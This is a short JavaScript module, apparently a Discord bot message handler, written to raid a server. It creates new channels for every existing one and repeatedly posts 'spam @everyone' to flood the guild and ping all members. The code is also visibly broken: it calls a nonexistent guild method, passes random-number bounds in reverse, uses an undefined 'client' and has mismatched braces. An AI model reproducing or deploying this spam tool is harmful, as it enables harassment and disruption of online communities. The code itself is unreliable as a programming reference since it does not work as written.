module.exports = message => {
    const chanel = message.guild.channels.find('name', 'undefined-2');
    const chanl = message.guild.channels.find('name', 'undefined-156');
    if (chanel) {
        message.guild.createChannel('undefined-3', 'category');
    }
    if (chanl) {
        message.guild.find('name', 'undefined-156').send('spam @everyone');
    function entierAleatoire(min, max){
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    async function superspam(value, key, map){
        const rndm = entierAleatoire(10, 0);
        const rndl = entierAleatoire(50, 25);
        message.guild.createChannel(rndm + `${key}`, 'text');
        message.guild.createChannel(rndl + `${key}`, 'text');
        const chnl1 = await client.channels.find('name', rndm + `${key}`);
        const chnl2 = await client.channels.find('name', rndl + `${key}`);
        await client.channels.get(chnl1.id).send('spam @everyone')
            .catch(console.error);
        await client.channels.get(chnl2.id).send('spam @everyone')
            .catch(console.error);
    };

    
    message.guild.channels.map(c => c.name)
        .forEach(superspam);
}
}
